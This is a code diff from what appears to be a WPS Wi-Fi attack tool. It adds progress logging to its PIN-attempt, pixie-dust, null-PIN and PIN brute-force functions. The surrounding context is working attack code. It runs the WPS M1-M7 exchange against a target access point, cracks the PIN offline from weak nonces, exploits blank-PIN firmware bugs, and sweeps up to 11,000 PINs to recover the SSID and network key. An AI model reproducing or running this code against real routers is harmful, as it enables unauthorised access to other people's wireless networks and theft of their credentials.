@@ -319,8 +319,17 @@ def attempt_pin(
     eapol_versions: tuple[int, ...] = (2, 1),
     passive: bool = False,
     pre_eapol_delay: float = 0.0,
+    progress_fn=None,
 ) -> AttemptResult:
     """Run one full association + M1..M7 cycle for a single 8-digit PIN guess.
+
+    progress_fn (if given) logs each phase transition (auth/assoc/M1..M7).
+    Deliberately NOT passed by wps_pin_bruteforce's sweep loop — that
+    would spam a phase-by-phase log for every one of up to 11,000
+    attempts. Bruteforce logs its own one-line-per-attempt summary
+    instead; this per-phase detail is for single-shot callers
+    (null_pin_attack, pixie_attempt's verification step) where one
+    attempt is the whole attack.
 
     `psk1_override`/`psk2_override` bypass the normal split_pin(pin8) ->
     psk_half() derivation and use these bytes directly instead — this is
@@ -338,8 +347,10 @@ def attempt_pin(
     """
     if psk1_override is None and pin8 is None:
         raise ValueError("attempt_pin needs either pin8 or both psk*_override")
+    log = progress_fn or (lambda msg: None)
     if channel is not None:
         set_channel(iface, channel)
+        log(f"channel set to {channel}")
     client = get_mac(iface)
     last_identifier: int | None = None
     eapol_version = 1
@@ -347,12 +358,15 @@ def attempt_pin(
     def finish(result: AttemptResult) -> AttemptResult:
         if last_identifier is not None:
             sendp(eap.craft_eap_failure(bssid, client, last_identifier, version=eapol_version), iface=iface, verbose=False)
+        log(f"attempt result: {result.outcome.value}" + (f" ({result.detail})" if result.detail else ""))
         return result
 
+    log(f"associating with {bssid}...")
     assoc_failure = _associate(iface, bssid, client, ssid, msg_timeout, pre_eapol_delay)
     if assoc_failure is not None:
         outcome, detail = assoc_failure
         return finish(AttemptResult(outcome, detail=detail))
+    log("associated — starting EAPOL")
 
     eapol_version, id_req = _send_eapol_start_adaptive(iface, bssid, client, msg_timeout, eapol_versions, passive)
     if id_req is None:
@@ -389,6 +403,7 @@ def attempt_pin(
         return finish(AttemptResult(AttemptOutcome.TIMEOUT))
     if m1.ap_setup_locked:
         return finish(AttemptResult(AttemptOutcome.AP_SETUP_LOCKED))
+    log("M1 received — sending M2")
 
     registrar = DHKeypair.generate()
     enrollee_mac = m1.mac_addr
@@ -419,6 +434,7 @@ def attempt_pin(
             return finish(AttemptResult(AttemptOutcome.AP_SETUP_LOCKED, detail=detail))
         return finish(AttemptResult(AttemptOutcome.TIMEOUT, detail=detail))
     last_identifier = m3_frame.identifier
+    log("M3 received — sending M4")
 
     if psk1_override is not None and psk2_override is not None:
         psk1, psk2 = psk1_override, psk2_override
@@ -441,6 +457,7 @@ def attempt_pin(
     last_identifier = next_frame.identifier
     if next_frame.opcode == eap.WSC_OP_NACK:
         return finish(AttemptResult(AttemptOutcome.FIRST_HALF_WRONG))
+    log("M5 received (first half correct) — sending M6")
 
     m6 = messages.build_m6(m1.n1, r_s2, keys.key_wrap_key, next_frame.payload, keys.auth_key)
     final_frame = _wait_for(
@@ -472,6 +489,7 @@ def pixie_attempt(
     eapol_versions: tuple[int, ...] = (2, 1),
     passive: bool = False,
     pre_eapol_delay: float = 0.0,
+    progress_fn=None,
 ) -> AttemptResult:
     """Pixie-dust offline WPS attack.
 
@@ -485,11 +503,14 @@ def pixie_attempt(
     Returns FIRST_HALF_WRONG outcome if pixie_dust() finds no PIN.
     Returns SUCCESS with real ssid/network_key if the full exchange completes.
     """
+    log = progress_fn or (lambda msg: None)
     if attempt_fn is None:
         attempt_fn = attempt_pin
 
     if channel is not None:
         set_channel(iface, channel)
+        log(f"channel set to {channel}")
+    log(f"associating with {bssid}...")
 
     client = get_mac(iface)
     msg_timeout_inner = max(msg_timeout, 5.0)
@@ -517,7 +538,9 @@ def pixie_attempt(
     assoc_failure = _associate(iface, bssid, client, ssid, msg_timeout_inner, pre_eapol_delay)
     if assoc_failure is not None:
         outcome, detail = assoc_failure
+        log(f"association failed: {outcome.value} ({detail})")
         return finish(AttemptResult(outcome, detail=detail))
+    log("associated — starting EAPOL")
 
     eapol_version, id_req = _send_eapol_start_adaptive(
         iface, bssid, client, msg_timeout_inner, eapol_versions, passive,
@@ -555,7 +578,9 @@ def pixie_attempt(
     if m1 is None:
         return finish(AttemptResult(AttemptOutcome.TIMEOUT))
     if m1.ap_setup_locked:
+        log("AP Setup Locked (from M1)")
         return finish(AttemptResult(AttemptOutcome.AP_SETUP_LOCKED))
+    log("M1 received — sending M2")
 
     registrar = DHKeypair.generate()
     n2 = os.urandom(16)
@@ -585,6 +610,7 @@ def pixie_attempt(
     m3 = messages.parse_m3(m3_frame.payload)
     if m3 is None:
         return finish(AttemptResult(AttemptOutcome.TIMEOUT))
+    log("M3 received — running pixie-dust offline crack")
 
     # Offline phase: try all pixie-dust modes
     ts = timestamp if timestamp is not None else int(time.time())
@@ -608,20 +634,25 @@ def pixie_attempt(
         pass
 
     if pd.pin is None:
+        log("pixie-dust found no vulnerable nonce — offline crack failed")
         return AttemptResult(AttemptOutcome.FIRST_HALF_WRONG)
+    log(f"pixie-dust recovered PIN {pd.pin} — verifying with a full M1-M7 exchange")
 
     # Verify the found PIN with a full M1→M7 attempt to get real credentials.
     # Try the EAPOL version that just worked first (fresh association, so
     # not guaranteed to work again, but a reasonable first guess).
-    return attempt_fn(
+    result = attempt_fn(
         iface, bssid, pd.pin, ssid, channel=channel, msg_timeout=msg_timeout,
         eapol_versions=(eapol_version, *[v for v in eapol_versions if v != eapol_version]),
-        passive=passive, pre_eapol_delay=pre_eapol_delay,
+        passive=passive, pre_eapol_delay=pre_eapol_delay, progress_fn=progress_fn,
     )
+    log(f"verification result: {result.outcome.value}")
+    return result
 
 
 def null_pin_attack(
     iface: str, bssid: str, ssid: str, channel: int | None = None, msg_timeout: float = 5.0,
+    progress_fn=None,
 ) -> AttemptResult:
     """The null-PIN attack: some AP firmware has a validation bug that
     accepts an empty/blank configured PIN as always-valid. One attempt,
@@ -636,7 +667,7 @@ def null_pin_attack(
     """
     return attempt_pin(
         iface, bssid, None, ssid, channel=channel, msg_timeout=msg_timeout,
-        psk1_override=b"", psk2_override=b"",
+        psk1_override=b"", psk2_override=b"", progress_fn=progress_fn,
     )
 
 
@@ -662,13 +693,21 @@ def wps_pin_bruteforce(
     attempt_fn=attempt_pin,
     try_null_pin: bool = True,
     null_pin_fn=null_pin_attack,
+    progress_fn=None,
 ) -> BruteforceResult:
     """Split-half PIN sweep: 0000-9999 first, then 000-999 (checksum derives digit 8).
 
     Tries the null-PIN attack first (one attempt, real signal either way)
     since it's free compared to the up-to-11,000-attempt sweep — matches
     how real WPS tools order this.
+
+    progress_fn, if given, is called after every attempt (this is the
+    longest-running, least-visible attack in the project — previously it
+    logged nothing at all between start and the final result, even across
+    an 11,000-attempt sweep that can run for hours) plus on every
+    stop/lockout/phase-transition event.
     """
+    log = progress_fn or (lambda msg: None)
     result = BruteforceResult(success=False)
     consecutive_timeouts = 0
 
@@ -676,33 +715,42 @@ def wps_pin_bruteforce(
         return stop_event is not None and stop_event.is_set()
 
     if try_null_pin and not _check_stop():
+        log("trying null-PIN (free attempt before the real sweep)")
         null_outcome = null_pin_fn(iface, bssid, ssid, channel=channel)
         result.attempts += 1
         if null_outcome.outcome is AttemptOutcome.AP_SETUP_LOCKED:
+            log("AP Setup Locked (from null-PIN attempt) — aborting")
             result.ap_setup_locked = True
             return result
         if null_outcome.outcome is AttemptOutcome.SUCCESS:
+            log("null-PIN succeeded — AP accepts a blank PIN")
             result.success = True
             result.pin = ""
             result.via_null_pin = True
             result.ssid, result.network_key = null_outcome.ssid, null_outcome.network_key
             return result
+        log(f"null-PIN: {null_outcome.outcome.value} — starting the real sweep (up to 11,000 attempts)")
         # Any other outcome (wrong/timeout) is not a real PIN signal --
         # fall through to the normal sweep unconditionally.
 
     first_half: str | None = None
     for f in range(10000):
         if _check_stop():
+            log(f"stopped during first-half sweep after {result.attempts} attempt(s)")
             return result
         pin8 = _probe_pin(f)
         outcome = attempt_fn(iface, bssid, pin8, ssid, channel=channel)
         result.attempts += 1
+        if result.attempts == 1 or result.attempts % 10 == 0 or outcome.outcome is not AttemptOutcome.FIRST_HALF_WRONG:
+            log(f"attempt {result.attempts} (first-half {f}/10000): PIN {pin8} -> {outcome.outcome.value}")
         if outcome.outcome is AttemptOutcome.AP_SETUP_LOCKED:
+            log(f"AP Setup Locked after {result.attempts} attempt(s) — aborting")
             result.ap_setup_locked = True
             return result
         if outcome.outcome is AttemptOutcome.TIMEOUT:
             consecutive_timeouts += 1
             if consecutive_timeouts >= max_consecutive_timeouts:
+                log(f"{consecutive_timeouts} consecutive timeouts — suspected lockout, aborting after {result.attempts} attempt(s)")
                 result.aborted_lockout = True
                 return result
             continue
@@ -710,40 +758,50 @@ def wps_pin_bruteforce(
         if outcome.outcome in (AttemptOutcome.SECOND_HALF_WRONG, AttemptOutcome.SUCCESS):
             first_half = f"{f:04d}"
             if outcome.outcome is AttemptOutcome.SUCCESS:
+                log(f"PIN found: {pin8}")
                 result.success = True
                 result.pin = pin8
                 result.ssid, result.network_key = outcome.ssid, outcome.network_key
                 return result
+            log(f"first half confirmed: {first_half} — starting second-half sweep (up to 1,000 attempts)")
             break
         # FIRST_HALF_WRONG: keep sweeping
 
     if first_half is None:
+        log(f"exhausted 10,000 first-half attempts without a match ({result.attempts} total) — unexpected, aborting")
         return result  # exhausted 10000 without a first-half match (shouldn't happen)
 
     for s in range(1000):
         if _check_stop():
+            log(f"stopped during second-half sweep after {result.attempts} attempt(s)")
             return result
         core7 = int(first_half) * 1000 + s
         checksum = pin_checksum(core7)
         pin8 = f"{core7:07d}{checksum}"
         outcome = attempt_fn(iface, bssid, pin8, ssid, channel=channel)
         result.attempts += 1
+        if s % 10 == 0 or outcome.outcome is AttemptOutcome.SUCCESS:
+            log(f"attempt {result.attempts} (second-half {s}/1000): PIN {pin8} -> {outcome.outcome.value}")
         if outcome.outcome is AttemptOutcome.AP_SETUP_LOCKED:
+            log(f"AP Setup Locked after {result.attempts} attempt(s) — aborting")
             result.ap_setup_locked = True
             return result
         if outcome.outcome is AttemptOutcome.TIMEOUT:
             consecutive_timeouts += 1
             if consecutive_timeouts >= max_consecutive_timeouts:
+                log(f"{consecutive_timeouts} consecutive timeouts — suspected lockout, aborting after {result.attempts} attempt(s)")
                 result.aborted_lockout = True
                 return result
             continue
         consecutive_timeouts = 0
         if outcome.outcome is AttemptOutcome.SUCCESS:
+            log(f"PIN found: {pin8}")
             result.success = True
             result.pin = pin8
             result.ssid, result.network_key = outcome.ssid, outcome.network_key
             return result
 
+    log(f"exhausted second-half sweep without a match ({result.attempts} total attempts)")
     return result
 
 
